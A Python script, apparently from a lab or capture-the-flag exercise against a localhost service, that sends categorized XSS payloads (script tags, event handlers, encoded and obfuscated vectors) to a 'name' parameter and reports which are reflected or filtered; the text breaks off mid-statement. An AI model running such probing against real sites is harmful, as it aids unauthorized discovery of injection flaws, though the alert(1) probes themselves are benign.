import requests
import urllib.parse
import urllib3
import time
import re

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

base_url = "http://127.0.0.1:33152/page"
max_retries = 3
retry_delay = 2

# Test payloads organized by category - reduced for stability
xss_payloads = {
    "Basic Script Tags": [
        "<script>alert(1)</script>",
        "<SCRIPT>alert(1)</SCRIPT>",
    ],
    
    "Event Handlers": [
        "<img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
        "<svg onload=alert(1)>",
        "<a href=# onclick=alert(1)>click</a>",
    ],
    
    "HTML Tags": [
        "<iframe src=javascript:alert(1)></iframe>",
        "<svg><script>alert(1)</script></svg>",
        "<details open ontoggle=alert(1)>",
    ],
    
    "Encoded Vectors": [
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<svg/onload=alert(1)>",
    ],
    
    "Obfuscated": [
        "<img src=x onerror='alert(1)'>",
        '<img src=x onerror="alert(1)">',
    ]
}

results = {
    "fully_reflected": [],
    "fully_blocked": [],
    "partially_filtered": []
}

print("=" * 80)
print("XSS FILTER ANALYSIS")
print("Testing XSS vectors against /page endpoint")
print("=" * 80)

for category, payloads in xss_payloads.items():
    print(f"\n[TESTING] {category}")
    print("-" * 80)
    
    for payload in payloads:
        encoded_payload = urllib.parse.quote(payload, safe='')
        
        for attempt in range(max_retries):
            try:
                url = f"{base_url}?name={encoded_payload}"
                response = requests.get(url, timeout=15, verify=False)
                response_text = response.text
                
                # Check reflection
                if payload in response_text:
                    print(f"[+] REFLECTED: {payload}")
                    results["fully_reflected"].append(payload)
                elif payload.lower() in response_text.lower():
                    print(f"[-] PARTIAL (case): {payload}")
                    results["partially_filtered"].append(f"{payload} (case modified)")
                else:
                    # Check if tag structure remains
                    tag_match = re.search(r'<(\w+)', payload)
                    if tag_match:
                        tag = tag_match.group(1)
                        if f"<{tag}" in response_text or f"<{tag.upper()}" in response_text.upper():
                            print(f"[-] PARTIAL (attr removed): {payload}")
                            results["partially_filtered"].append(f"{payload} (attributes removed)")
                        else:
                            print(f"[-] BLOCKED: {payload}")
                            results["fully_blocked"].append(payload)
                    else:
                        print(f"[-] BLOCKED: {payload}")
                        results["fully_blocked"].append(payload)
                
                break  # Success, no retry needed
                
            except Exception as e:
                if attempt < max_retries - 1:
                    print(f"[!] Error (retry {attempt+1}/{max_retries}): {e}")
                    time.sleep(retry_delay)
                else:
                    print(f"[!] FAILED after {max_retries} attempts: {payload}")
                    break
        
        # Rate limiting
        time.sleep(0.5)

print(f"\n{'=' * 80}")
print("SUMMARY")
print("=" * 80)

print(f"\n[+] Fully Reflected ({len(results['fully_reflected'])}):")
for p in results['fully_reflected']:
    print(f"  - {p}")

print(f"\n[-] Partially Filtered ({len(results['partially_filtered'])}):")
for p in results['partially_filtered']:
    print(f"  - {p}")

print(f"\n[x] Fully Blocked ({len(results['fully_blocked'])}):")
for p in results['fully_blocked'][:5]:  # Show first 5
    print(f"  - {p}")
if len(results['fully_blocked']) > 5:
    print(f"  ... and {len(results['fully_blocked']) - 5} more")

# Filter pattern analysis
if results['fully_reflected']:
    print(f"\n[ANALYSIS] Filter allows:")
    for p in results['fully_reflected']:
        print(f"  - {p}")
        
    # Test one reflected payload in detail
    test_payload = results['fully_reflected'][0]
    test_url = f"{base_url}?name={urllib.parse.quote(test_payload, safe='')}"
    try:
        test_resp = requests.get(test_url, timeout=15, verify=False)
        print(f"\n[DEBUG] Response context for: {test_payload}")
        
        # Find payload in response
        if test_payload in test_resp.text:
            idx = test_resp.text.index(test_payload)
            context = test_resp.text[max(0, idx-200):min(len(test_resp.text), idx+len(test_payload)+200)]
            print(context)
    except Exception as e:
